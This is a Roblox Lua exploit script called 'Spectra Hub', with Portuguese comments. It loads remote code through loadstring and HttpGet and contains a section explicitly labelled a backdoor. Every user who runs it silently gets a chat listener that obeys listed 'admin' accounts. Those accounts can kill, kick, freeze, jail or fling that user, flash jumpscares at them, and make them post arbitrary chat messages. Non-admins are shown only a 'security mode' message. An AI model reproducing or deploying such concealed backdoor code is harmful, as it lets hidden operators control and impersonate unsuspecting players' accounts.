local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

-- Função para criar gradiente de texto
function gradient(text, startColor, endColor)
    local result = ""
    local length = #text

    for i = 1, length do
        local t = (i - 1) / math.max(length - 1, 1)
        local r = math.floor((startColor.R + (endColor.R - startColor.R) * t) * 255)
        local g = math.floor((startColor.G + (endColor.G - startColor.G) * t) * 255)
        local b = math.floor((startColor.B + (endColor.B - startColor.B) * t) * 255)

        local char = text:sub(i, i)
        result = result .. "<font color=\"rgb(" .. r ..", " .. g .. ", " .. b .. ")\">" .. char .. "</font>"
    end

    return result
end

local Confirmed = false

-- Popup inicial
WindUI:Popup({
    Title = "Spectra Hub - Developers/Admins",
    Icon = "rbxassetid://17698154602",
    Content = "Click 'Load' to start" .. gradient(" Spectra", Color3.fromHex("#FF0800"), Color3.fromHex("#FF0000")) .. " New Era!",
    Buttons = {
        {
            Title = "Cancel",
            Icon = "",
            Callback = function() end,
            Variant = "Secondary",
        },
        {
            Title = "Load",
            Icon = "arrow-right",
            Callback = function() Confirmed = true end,
            Variant = "Primary",
        }
    }
})

repeat wait() until Confirmed

-- ================= SERVIÇOS =================
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local TextChatService = game:GetService("TextChatService")
local ContextActionService = game:GetService("ContextActionService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

-- ================= LISTA DE ADMINS =================
local authorizedAdmins = {
    [""] = true,
    ["Fernandes12395"] = true, -- KingX
    ["udydydi2usy6d6d"] = true,
    [""] = true,
    [""] = true,
    [""] = true,
    [""] = true,
    [""] = true,
    [""] = true,
    [""] = true,
    [""] = true
}

-- ================= VARIÁVEIS GLOBAIS =================
local jailConnections = {}
local floatConnections = {}
local Controlling = false
local ControlledHum = nil
local target = ""

-- ================= FUNÇÕES DE VERIFICAÇÃO =================
local function isAdmin(player)
    return authorizedAdmins[player.Name] == true
end

local function GetPlayers()
    local t = {}
    for _, p in pairs(Players:GetPlayers()) do
        table.insert(t, p.Name)
    end
    return t
end

-- ================= FUNÇÕES DE COMUNICAÇÃO =================
local function EnviarComandoChat(msg)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if canal then canal:SendAsync(msg) end
end

-- ================= FUNÇÕES DE EFEITOS =================
local function ExecutarJumpscare(tipo)
    local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
    local img = Instance.new("ImageLabel", gui)
    img.Size = UDim2.new(1, 0, 1, 0)
    img.BackgroundTransparency = 1
    
    local s = Instance.new("Sound", workspace)
    s.Volume = 10
    
    if tipo == 1 then
        img.Image = "rbxassetid://9129699706"
        s.SoundId = "rbxassetid://138186576"
    elseif tipo == 2 then
        img.Image = "rbxassetid://7260178526"
        s.SoundId = "rbxassetid://9118828563"
    elseif tipo == 4 then
        img.Image = "rbxassetid://13932329484"
        s.SoundId = "rbxassetid://5710016194"
    end
    
    s:Play()
    task.wait(1.2)
    gui:Destroy()
    s:Destroy()
end

local function KillPlusEffect(targetPlayer)
    local char = targetPlayer.Character
    if not char then return end
    
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    
    -- Criar múltiplos blocos coloridos
    local colors = {
        Color3.fromRGB(255, 0, 0),     -- Vermelho
        Color3.fromRGB(0, 255, 0),     -- Verde
        Color3.fromRGB(0, 0, 255),     -- Azul
        Color3.fromRGB(255, 255, 0),   -- Amarelo
        Color3.fromRGB(255, 0, 255),   -- Magenta
        Color3.fromRGB(0, 255, 255),   -- Ciano
        Color3.fromRGB(255, 255, 255), -- Branco
    }
    
    local blocks = {}
    
    for i = 1, 20 do
        local block = Instance.new("Part")
        block.Size = Vector3.new(2, 2, 2)
        block.Position = root.Position + Vector3.new(
            math.random(-5, 5),
            math.random(0, 10),
            math.random(-5, 5)
        )
        block.Color = colors[math.random(1, #colors)]
        block.Material = Enum.Material.Neon
        block.Anchored = false
        block.CanCollide = true
        block.Parent = workspace
        
        -- Adicionar força para cima
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Velocity = Vector3.new(
            math.random(-50, 50),
            math.random(100, 200),
            math.random(-50, 50)
        )
        bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
        bodyVelocity.Parent = block
        
        table.insert(blocks, block)
        
        -- Destruir após alguns segundos
        game:GetService("Debris"):AddItem(block, 5)
    end
    
    -- Matar o jogador
    char:BreakJoints()
    
    -- Limpar blocos após efeito
    task.wait(3)
    for _, block in ipairs(blocks) do
        if block and block.Parent then
            block:Destroy()
        end
    end
end

local function FloatEffect(targetPlayer)
    local char = targetPlayer.Character
    if not char then return end
    
    local root = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not root or not hum then return end
    
    -- Parar efeito anterior se existir
    if floatConnections[targetPlayer.Name] then
        floatConnections[targetPlayer.Name]:Disconnect()
        floatConnections[targetPlayer.Name] = nil
    end
    
    local floating = true
    local originalPosition = root.Position.Y
    local time = 0
    
    floatConnections[targetPlayer.Name] = RunService.Heartbeat:Connect(function(deltaTime)
        if not char or not char.Parent or hum.Health <= 0 then
            floating = false
            if floatConnections[targetPlayer.Name] then
                floatConnections[targetPlayer.Name]:Disconnect()
                floatConnections[targetPlayer.Name] = nil
            end
            return
        end
        
        time = time + deltaTime * 5 -- Velocidade do float
        local offset = math.sin(time) * 3 -- Altura do float (3 unidades)
        root.CFrame = CFrame.new(root.Position.X, originalPosition + offset, root.Position.Z)
    end)
end

-- ================= SISTEMA DE BACKDOOR =================
local function ProcessarComando(msgText, authorName)
    if not authorizedAdmins[authorName] then return end 
    
    local cmd = msgText:lower()
    local me = LocalPlayer.Name:lower()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")

    -- Comandos básicos
    if cmd:match(";kill%s+"..me) and char then char:BreakJoints() end
    if cmd:match(";kick%s+"..me) then LocalPlayer:Kick(" [♦️SPECTRA HUB♦️] Admin ") end
    if cmd:match(";speed%s+"..me) and hum then hum.WalkSpeed = 100 end
    if cmd:match(";backrooms%s+"..me) and root then root.CFrame = CFrame.new(59, 9996, 19) end
    if cmd:match(";jumps1%s+"..me) then ExecutarJumpscare(1) end
    if cmd:match(";jumps2%s+"..me) then ExecutarJumpscare(2) end
    if cmd:match(";jumps4%s+"..me) then ExecutarJumpscare(4) end
    if cmd:match(";say%s+"..me) then EnviarComandoChat(msgText:sub(7 + #me)) end

    -- Novos comandos
    if cmd:match(";killplus%s+"..me) and char then KillPlusEffect(LocalPlayer) end
    if cmd:match(";float%s+"..me) then FloatEffect(LocalPlayer) end
    
    if cmd:match(";bring%s+"..me) and root then
        local adminPlayer = Players:FindFirstChild(authorName)
        if adminPlayer and adminPlayer.Character then
            local adminRoot = adminPlayer.Character:FindFirstChild("HumanoidRootPart")
            if adminRoot then
                EnviarComandoChat("[SPECTRA] Teleportando " .. LocalPlayer.Name .. " para " .. authorName)
                root.CFrame = adminRoot.CFrame * CFrame.new(0, 0, -3)
            end
        end
    end

    if cmd:match(";fling%s+"..me) and root then
        root.Velocity = Vector3.new(0, 5000, 0)
        task.wait(0.1)
        root.CFrame = CFrame.new(0, 1000000, 0)
    end

    if cmd:match(";freeze%s+"..me) and root then
        root.Anchored = true
        if hum then hum.WalkSpeed = 0 end
    end
    
    if cmd:match(";unfreeze%s+"..me) and root then
        root.Anchored = false
        if hum then hum.WalkSpeed = 16 end
    end

    if cmd:match(";jail%s+"..me) and root then
        local pos = root.Position
        local model = Instance.new("Model", workspace)
        model.Name = "Jail_"..LocalPlayer.Name
        
        local function createWall(size, cf)
            local part = Instance.new("Part", model)
            part.Size = size
            part.CFrame = root.CFrame * cf
            part.Anchored = true
            part.Material = "ForceField"
            part.Color = Color3.fromRGB(255, 0, 0)
        end
        
        createWall(Vector3.new(12, 1, 12), CFrame.new(0, -3.5, 0)) -- Chão
        createWall(Vector3.new(12, 1, 12), CFrame.new(0, 8, 0))   -- Teto
        createWall(Vector3.new(1, 12, 12), CFrame.new(6, 2, 0))   -- Parede direita
        createWall(Vector3.new(1, 12, 12), CFrame.new(-6, 2, 0))  -- Parede esquerda
        
        jailConnections[me] = RunService.Heartbeat:Connect(function()
            if root and (root.Position - pos).Magnitude > 5 then 
                root.CFrame = CFrame.new(pos) 
            end
        end)
    end

    if cmd:match(";unjail%s+"..me) then
        if workspace:FindFirstChild("Jail_"..LocalPlayer.Name) then 
            workspace:FindFirstChild("Jail_"..LocalPlayer.Name):Destroy() 
        end
        if jailConnections[me] then 
            jailConnections[me]:Disconnect()
            jailConnections[me] = nil 
        end
    end
end

-- Configurar listener de mensagens
for _, ch in ipairs(TextChatService.TextChannels:GetChildren()) do
    if ch:IsA("TextChannel") then 
        ch.MessageReceived:Connect(function(m) 
            if m.TextSource then 
                ProcessarComando(m.Text, m.TextSource.Name) 
            end 
        end) 
    end
end

-- ================= VERIFICAÇÃO DE ADMIN =================
if not isAdmin(LocalPlayer) then
    print(" [♦️SPECTRA HUB♦️]  | Modo Segurança Ativado.")
    return
end

-- ================= INTERFACE PRINCIPAL =================
local Window = WindUI:CreateWindow({
    Title = "<font color='rgb(255, 0, 0)'>Spectra Hub - Painel Admin</font>",
    Icon = "rbxassetid://17698154602",
    Author = "<font color='rgb(255, 0, 0)'>Spectra Hub | Studios</font>",
    Folder = "SpectraXz",
    Size = UDim2.fromOffset(550, 300),
    Transparent = true,
    HideSearchBar = false,
    Theme = "Dark",
    User = {
        Enabled = true
    },
    SideBarWidth = 200,
    HideSearchBar = false,
    ScrollBarEnabled = true,
    HasOutline = true,
    Background = "rbxassetid://17698154602"
})

-- Notificação inicial
WindUI:Notify({
    Title = "Painel Admin",
    Content = "[♦️SPECTRA SECURITY♦️] carregado por " .. LocalPlayer.DisplayName,
    Duration = 3,
    Icon = "shield",
})

-- ================= ABA 1: ADMIN BÁSICO =================
local TabAdmin = Window:Tab({ Title = "Admin", Icon = "shield" })

-- Seletor de alvo
TabAdmin:Dropdown({ 
    Title = "🎯 Selecionar Alvo", 
    Values = GetPlayers(), 
    Callback = function(v) 
        target = v 
        WindUI:Notify({
            Title = "Alvo Selecionado",
            Content = "Alvo: " .. v,
            Duration = 2,
            Icon = "target"
        })
    end 
})

-- Comandos básicos organizados em linha
local basicCommands = {"kick", "kill", "fling", "jail", "unjail", "freeze", "unfreeze"}
for _, cmd in ipairs(basicCommands) do
    TabAdmin:Button({ 
        Title = cmd:upper(), 
        Callback = function() 
            if target ~= "" then 
                EnviarComandoChat(";"..cmd.." "..target) 
            end 
        end 
    })
end

-- Comandos especiais
TabAdmin:Section({ Title = "Comandos Especiais" })

TabAdmin:Button({ 
    Title = "KILLPLUS", 
    Callback = function() 
        if target ~= "" then 
            local targetPlayer = Players:FindFirstChild(target)
            if targetPlayer then
                EnviarComandoChat(";killplus "..target)
                KillPlusEffect(targetPlayer)
            end
        end 
    end 
})

TabAdmin:Button({ 
    Title = "BRING", 
    Callback = function() 
        if target ~= "" then 
            EnviarComandoChat(";bring "..target)
        end 
    end 
})

TabAdmin:Button({ 
    Title = "FLOAT", 
    Callback = function() 
        if target ~= "" then 
            local targetPlayer = Players:FindFirstChild(target)
            if targetPlayer then
                EnviarComandoChat(";float "..target)
                FloatEffect(targetPlayer)
            end
        end 
    end 
})

TabAdmin:Button({ 
    Title = "SPEED", 
    Callback = function() 
        if target ~= "" then 
            EnviarComandoChat(";speed "..target)
        end 
    end 
})

TabAdmin:Button({ 
    Title = "BACKROOMS", 
    Callback = function() 
        if target ~= "" then 
            EnviarComandoChat(";backrooms "..target)
        end 
    end 
})

-- ================= ABA 2: CONTROLE =================
local TabControl = Window:Tab({ Title = "Controle", Icon = "user-cog" })

local sayMsg = ""
TabControl:Input({ 
    Title = "📝 Mensagem Say", 
    Callback = function(v) 
        sayMsg = v 
    end 
})

TabControl:Button({ 
    Title = "Forçar Fala (SAY)", 
    Callback = function() 
        if target ~= "" then 
            EnviarComandoChat(";say "..target.." "..sayMsg)
        end 
    end 
})

-- Sistema de controle de jogador
local function ToggleControl()
    if Controlling then
        -- Desativar controle
        Controlling = false
        ControlledHum = nil
        Camera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
        ContextActionService:UnbindAction("ControlMove")
        WindUI:Notify({
            Title = "Controle",
            Content = "Controle desativado",
            Duration = 2,
            Icon = "user-x"
        })
    else
        -- Ativar controle
        local p = Players:FindFirstChild(target)
        if p and p.Character then
            ControlledHum = p.Character:FindFirstChildOfClass("Humanoid")
            Controlling = true
            Camera.CameraSubject = ControlledHum
            
            ContextActionService:BindAction("ControlMove", function(_, state, input)
                if not Controlling or not ControlledHum then return end
                
                local dir = Vector3.new(0,0,0)
                if input.KeyCode == Enum.KeyCode.W then dir = Vector3.new(0,0,-1)
                elseif input.KeyCode == Enum.KeyCode.S then dir = Vector3.new(0,0,1)
                elseif input.KeyCode == Enum.KeyCode.A then dir = Vector3.new(-1,0,0)
                elseif input.KeyCode == Enum.KeyCode.D then dir = Vector3.new(1,0,0)
                elseif input.KeyCode == Enum.KeyCode.Space then ControlledHum.Jump = true end
                
                ControlledHum:Move(dir, true)
            end, false, Enum.KeyCode.W, Enum.KeyCode.S, Enum.KeyCode.A, Enum.KeyCode.D, Enum.KeyCode.Space)
            
            WindUI:Notify({
                Title = "Controle",
                Content = "Controlando: " .. target,
                Duration = 2,
                Icon = "user-check"
            })
        end
    end
end

TabControl:Button({ 
    Title = "🎮 Controlar Alvo", 
    Callback = ToggleControl 
})

-- ================= ABA 3: TERROR =================
local TabJump = Window:Tab({ Title = "Terror", Icon = "skull" })

TabJump:Button({ 
    Title = "Jumpscare 1", 
    Callback = function() 
        if target ~= "" then 
            EnviarComandoChat(";jumps1 "..target) 
        end 
    end 
})

TabJump:Button({ 
    Title = "Jumpscare 2", 
    Callback = function() 
        if target ~= "" then 
            EnviarComandoChat(";jumps2 "..target) 
        end 
    end 
})

TabJump:Button({ 
    Title = "Jumpscare 4", 
    Callback = function() 
        if target ~= "" then 
            EnviarComandoChat(";jumps4 "..target) 
        end 
    end 
})

-- ================= NOTIFICAÇÃO FINAL =================
WindUI:Notify({ 
    Title = "[♦️SPECTRA HUB♦️]", 
    Content = "Painel de Administrador Carregado com Sucesso!", 
    Icon = "check" 
})